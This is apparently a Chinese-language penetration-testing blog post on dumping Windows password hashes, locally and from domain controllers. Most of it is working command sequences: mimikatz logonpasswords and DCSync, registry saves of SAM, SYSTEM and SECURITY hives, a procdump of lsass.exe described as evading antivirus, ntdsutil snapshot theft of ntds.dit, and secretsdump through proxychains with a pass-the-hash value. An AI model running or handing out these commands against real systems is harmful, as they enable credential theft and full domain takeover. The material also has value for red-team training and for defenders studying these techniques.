---
title: windows hash抓取
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 56
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 攻防
  - 内网渗透
categories:
  - 攻防
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter

---

<!--more-->

> 市面上可见到的读Windows本地密码的大多工具都是变则法子的去读lsass.exe的内存或者SAM数据库，然后从里面提取hash。所以有杀软的情况下读密码这事根本就不是工具免不免杀的问题，而是杀软有没有监控保护lsass.exe或SAM的问题，所以读本地密码条件可以总结为：
>
> > 能正常访访问lsass.exe内存或SAM数据库。
>
> 感觉网上搜到的文章大多都很垃圾，上来就一顿讲一堆工具怎么抓hash，实际上抓hash还是一个权限的问题，有了权限以后就可以抓，没权限换100个工具也不行
> 

# hash

Windows 系统中的密码一般由两部分组成，分别是 LM Hash 和 NTLM Hash，结构通常如下：

```none
username:RID:LM-Hash:NT-Hash
```

LM Hash（LAN Manager Hash）是 Windows 最早使用的加密算法，它不太安全，现在已经被NTLM hash取代了。

在 Windows Vista 和 Windows Server 2003 及之前的系统默认使用的是 LM 加密，只有用户密码超过 14 位时才会使用 NTLM 加密，之后从 Vista 的系统开始，不再使用 LM Hash 加密，而是全部采用了 NTLM Hash 加密。

如果用户密码为空密码或者不存储 LM Hash 的话，我们抓到的 LM Hash 就是 AAD3B435B51404EEAAD3B435B51404EE，所以在 Vista 和 Windows Server 2003 之后的系统里抓取到的 LM Hash 都是 AAD3B435B51404EEAAD3B435B51404EE，其实这里的 LM Hash 也没有任何意义了。

也就是说从Windows Vista 和 Windows Server 2008 开始，默认情况下只存储 NTLM Hash，LM Hash 将不再被使用。



# hash存储的过程

本地：用户输入->lsass进程存储明文到内存里->转为hash 并和本地存储SAM数据库里面的hash进行比较->hash相同 允许登录

域：

Windows 系统一般使用两种方法对用户的密码进行加密处理，在域环境中，用户的密码信息以哈希值的密文形式存储在 ntds.dit 二进制文件中，该文件位于 %SystemRoot%\ntds\ntds.dit 路径下，由于该文件一直被活动目录访问，因此这个文件是被系统禁止读取的。

在非域环境中，即工作组的环境中，用户的密码等信息被存储在 SAM 文件中，该文件也同样是被系统禁止读取的。





# 文件

有几个比较关键的文件：

- SAM：SAM记录的数据包括所有组、账户信息、密码HASH、账户SID等，它不但有文件数据，在注册表里面还有一个数据库，位于HKEY_LOCAL_MACHINE\\SAM下
- SYSTEM：对应的注册表分支为HKEY_LOCAL_MACHINE\SYSTEM，对应的存储文件是\Windows\System32\config\SYSTEM，其作用是存储计算机硬件和系统的信息。
- security：对应的分支HKEY_LOCAL_MACHINE\SECURITY，存储在C:\Windows\System32\config\SECURITY文件中，保存了安全性设置信息。
- ntds.dit：在域中的所有账号密码被存放在了 ntds.dit 文件中，如果获取到该文件就相当于拿到整个域权限，不过该文件只在域控中。



# 本地hash抓取

密码抓取与获取主要使用 mimikatz，但目标机器存在杀软时，如果没有免杀手段 mimikatz 必然是落地死的。

所以我们需要将 Lsass 进程内存下载下来到本地用 mimikatz 读取。

下面主要介绍两种方式获取本地密码

①在目标机器直接跑 mimikatz

②将目标机器 lsass 内存下载下来，在本地用 mimikatz 读

## 直接跑

Mimikatz 存在两个可选组件：

mimidrv：与 Windows 内核交互的驱动程序

mimilib：绕过 AppLocker，验证包 / SSP，密码过滤器以及用于 WinDBG 的 sekurlsa

Mimikatz 需要管理员或者 SYSTEM 权限，使用 DEBUG 权限执行某些操作，与 LSASS 进程进行交互。

**读取密码**

```
privilege::debug   #获取system权限
sekurlsa::logonpasswords  #获取本地密码
```



## 导出目标 Lsass 进程内存

- 注册表导出

由管理员权限的话甚至可以这样，直接注册表导出把这几个文件提出来，然后本地secertdump提取hash

```
reg save hklm\system C:\Users\Adrian\Desktop\system
reg save hklm\sam C:\Users\Adrian\Desktop\sam
reg save hklm\security C:\Users\Adrian\Desktop\security
```

- 或者使用 ninjacopy 脚本：https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1

```
Import-Module -name .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path "C:\Windows\System32\config\SAM" -LocalDestination "c:\sam.hiv"Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "c:\system.hiv"Invoke-NinjaCopy -Path "C:\Windows\System32\config\SECURITY" -LocalDestination "c:\security.hiv"
```

-  procdump 工具导出

该工具是微软提供的系统维护工具，带有微软签名，所以自带免杀。原理：把 lsass 进程的内存给下载下来，然后使用 mimikatz 提取。

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp



弄到本地读取hash
sekurlsa::minidump lsass.dmp
log
sekurlsa::logonpasswords
```

- 使用一些漏洞也可以获取到 SAM、SYSTEM、SECURITY 文件，比如 CVE-2021-36934



然后在本地将 hash 给弄出来

```
lsadump::sam /sam:sam /system:system
or
secretsdump.py LOCAL -system system -sam sam -security security


```





# 域内hash抓取

域中的账户密码采用的是集中管理而非本地模式，即密码保存在的是 DC，而不在本地，==但当认证成功后，本地内存中是存在密码的==。

C:\Windows\NTDS\ntds.dit 或 % SystemRoot%\NTDS 是域控中一个专属的活动目录数据库，包括有关域用户、组和组成员身份的信息。它还包括域中所有用户的密码哈希值。但由于系统高级用户的占用，这种重要文件用户正常情况下是无法对其进行任何操作的。

有域管权限的情况下：

比如说委派抓到了域管的TGT

## mimikatz 直接获取域密码

```
privilege::debug   #获取system权限
lsadump::dcsync /domain:test.com /all /csv  #获取密码
```

other 命令

```
sekurlsa::logonpasswords # 此命令可以看到当前客户端所有用户以及域名
lsadump::dcsync /domain:域名 /all /csv 
# 利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。（和下面的导出同原理）
# 查看所有用户凭证信息
lsadump::lsa /inject
```





## 导出域内密码数据库，然后本地使用 mimikatz 获取

域内 hash 保存在 c:\windows\ntds\ntds.dit 中，是一个 esent 数据库，导出域内 HASH 时 需要域管权限： 获取域管权限后，因为文件实时占用，所以无法直接导出，需要使用 ShadowCopy 的方法将 ntds.dit 提取出来

```
#首先创建快照
Ntdsutil snapshot "activate instance ntds" create quit quit
#创建快照后会生成一个快照 ID，挂载该 ID 的快照
Ntdsutil snapshot "mount {39842c86-23d2-4084-9049-ce07926721dd}" quit quit
#快照成功挂载后会映射到一个指定目录下，接下来从该目录下拷贝对应的密码文件
Copy 'C:\$SNAP_202107241427_VOLUMEC$\windows\NTDS\ntds.dit' c:\ntds.dit
#清理快照痕迹，卸载快照
Ntdsutil snapshot "unmount {39842c86-23d2-4084-9049-ce07926721dd}" quit quit
#删除快照
Ntdsutil snapshot "delete {39842c86-23d2-4084-9049-ce07926721dd}" quit quit
#上述步骤成功获取了存有域内所有 Hash 的数据库，接下来是从域控上导出解密Key
Reg save HKLM\SYSTEM c:\sys.hiv
#使用 NTDSDumpEx 导出的 Key 解密数据库获取hash
NTDSDumpEx.exe -d ntds.dit -o hash.txt -s sys.hiv -h
```

之后可以使用ntdsdump进行离线提取Hash:

```
ntdsdump.exe -f ntds.dit -s SYSTEM
```

参数说明

```
ntdsdump.exe <-f ntds.dit> <-k HEX-SYS-KEY | -s system.hiv> [-o out.txt] [-h] [-t JOHN|LC] * -f ntds.dit路径 * -k 可选的十六进制格式的SYSKEY * -s 可选的system.hiv路径 * -h 导出历史密码记录 * -t 导出格式，LC或JOHN * -o 导出到指定文件中 *
```

PS：前面步骤不报错就不需要这一步。

我们拿到的用户凭证文件 ntds.dit 在获取的时候文件是被占用状态，所以获取的文件可能会有一些问题，这时候我们就需要先进行一步修复操作。

```
# esentutl 是一个微软自带的工具,是专门用来对微软系统数据库进行一些常用操作的工具包,其中/p就代表使用修复功能
esentutl /p /o ntds.dit
```



## impacket

这里以及导入了票据了，抓取某个机器的hash

```
proxychains python3 secretsdump.py -k -no-pass Fileserver.xiaorang.lab -dc-ip 172.22.60.8
```

DcSync

```
proxychains secretsdump.py xiaorang.lab/'Fileserver$':@172.22.60.8 -hashes ':951d8a9265dfb652f42e5c8c497d70dc' -just-dc-user Administrator
```





